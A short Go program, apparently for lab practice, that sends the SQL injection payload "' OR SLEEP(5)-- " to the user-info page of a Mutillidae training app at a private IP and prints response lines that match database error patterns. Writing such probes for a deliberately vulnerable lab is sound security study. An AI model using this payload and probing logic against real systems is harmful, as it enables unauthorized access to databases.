package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

var payloads = []string{
	"' OR SLEEP(5)-- ",
}

var sqlErrors = []string{
	"SQL",
	"MySQL",
	"ORA-",
	"syntax",
}

var errRegex []*regexp.Regexp

func main() {
	for _, err := range sqlErrors {
		reg := regexp.MustCompile(fmt.Sprintf(".*%s.*", err))
		errRegex = append(errRegex, reg)
	}

	for _, pay := range payloads {
		fmt.Println(pay)
		body := fmt.Appendf(nil, "username=%s&password=asds&", url.QueryEscape(pay))
		fmt.Printf("payload %s ", body)
		req, err := http.NewRequest("GET", fmt.Sprintf("http://172.16.21.129/mutillidae/index.php?page=user-info.php&%suser-info-php-submit-button=View+Account+Details", body), bytes.NewReader(body))
		if err != nil {
			log.Panic(" req ", err)
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		// req.Header.Set("Cookie", "security=high; PHPSESSID=7f00f6a5baec67d8ac4b4491b1262bf9")
		c := &http.Client{
			Jar: http.DefaultClient.Jar,
		}
		res, err := c.Do(req)
		if err != nil {
			log.Panic(" do ", err)
		}
		defer res.Body.Close()

		resbody, err := io.ReadAll(res.Body)

		regErr := ""
		for _, reg := range errRegex {
			if reg.MatchString(string(resbody)) {
				if err != nil {
					if reg.MatchString(err.Error()) {
						fmt.Println("match err,", err)
					}
				}
				regErr = reg.String()
			}
		}

		if len(regErr) != 0 {
			bodyS := strings.Split(string(resbody), "\n")
			for _, l := range bodyS {

				if isMatch, _ := regexp.MatchString(regErr, l); isMatch {
					fmt.Println(l)
				}
			}
		}

	}

}
